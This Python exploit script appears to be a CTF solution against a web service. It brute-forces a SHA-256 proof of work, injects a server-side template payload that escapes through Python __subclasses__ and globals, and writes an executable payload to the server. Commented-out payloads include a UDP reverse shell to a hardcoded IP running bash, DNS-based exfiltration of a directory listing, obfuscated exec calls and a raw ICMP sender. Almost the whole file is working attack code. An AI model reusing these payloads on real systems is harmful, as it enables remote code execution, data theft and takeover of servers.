import requests
import hashlib
import string
import re
import time
import os
import socket

sockaddr=('134.175.230.10',6000)
#base='http://192.168.142.136:80/'
base='http://222.85.25.41:6001/'
charset=string.ascii_letters + string.digits
link_re=re.compile(r'^.*?<a href="read\?filename=(.*?)">')
txt=r'''/{{[].__class__.__base__.__subclasses__()[133].__init__.__globals__['sys']['breakpointhook']()}}'''

def getlist(s):
    res=s.get(base)
    for l in res.text.splitlines():
        mat=link_re.match(l)
        if mat:
            yield mat.group(1)

def pow(s):
    res=s.get(base+'pow')
    js=res.json()
    #print('== calc pow')
    pfx=js['text']
    tgt=js['hash']
    for a in charset:
        for b in charset:
            for c in charset:
                for d in charset:
                    work=a+b+c+d
                    if hashlib.sha256((pfx+work).encode()).hexdigest()==tgt:
                        #print('== pow ok')
                        return work
    raise RuntimeError('pow fuck')
    
def read(s,fn,w):
    res=s.get(base+'read',params={
        'filename': fn,
        'work': w,
    })
    return res.text
    
def write(s,text,w):
    res=s.get(base+'write',params={
        'text': text,
        'work': w,
    })
    return res.text

s=None
def s_connect():
    global s
    s=socket.socket()
    s.connect(sockaddr)
    s.send(b'player\n')
    time.sleep(.25)
    txt=s.recv(1000).decode()
    uuid=txt.partition('\nYour UUID: ')[2].partition('\n\n')[0]
    return uuid
           
def s_upload(txt):
    if not s: return
    s.send(txt.encode()+b'\n')
    time.sleep(.25)
    
def s_close():
    global s
    if s: s.close()
    s=None
           
#txt=r'''/{{'1'.__class__.mro()[-1].__subclasses__()[80].__init__.__globals__['__bu\x69ltins__']['ex\x65c']('ex\x65c(input())')}}'''
           
#payload=r'''import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(('45.76.217.45',6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);'''
#payload=r'''open("log/bomb","w").write("bomb")'''
#payload=r'''import os,socket,json,base64;t=base64.b64encode(json.dumps(os.listdir('~')).encode()).decode().replace('+','-').replace('/','_').replace('=','')[:62];socket.getaddrinfo(t+'.de3.xmcp.pku.edu.cn',80)'''
#payload=r'''exec('from socket import*\nfrom struct import*\nF=0xffffffff\nG=0xffff\nS=socket(AF_INET,SOCK_RAW,getprotobyname("icmp"))\nH=pack("bbHHh",8,0,0,123,1)\nD=192*b"W"\ns=H+D\nu=0\nt=(len(s)/2)*2\nc=0\nwhile c<t:u,c=(u+(s[c+1])*256+(s[c]))&F,c+2\nif t<len(s):u=(u+(s[len(s)-1]))&F\nu=(u>>16)+(u&G)\nu=u+(u>>16)\na=~u\na=a&G\na=a>>8|(a<<8&0xff00)\nH=pack("bbHHh",8,0,htons(a),123,1)\nfor _ in range(10):S.sendto(H+D,("45.76.217.45",1))')''' 
payload=r'''p exec(import os\nfor i in range(1000):\n\tos.fdopen(i,"w").write("ERROR%d"%i))'''
def work():
    uuid=s_connect()
    #uuid='d65a492a-5e3c-4cb8-841b-5b5092144518'
    print('uuid is',uuid,'uploading txt')
    s_upload(txt)
    s=requests.Session()
    print('pow 1')
    w=pow(s)
    print(w)
    print(read(s,uuid,w))
    time.sleep(.25)
    print('read done, pow 2')
    s_close()
    w=pow(s)
    print(write(s,payload,w))
    print('write done')

work()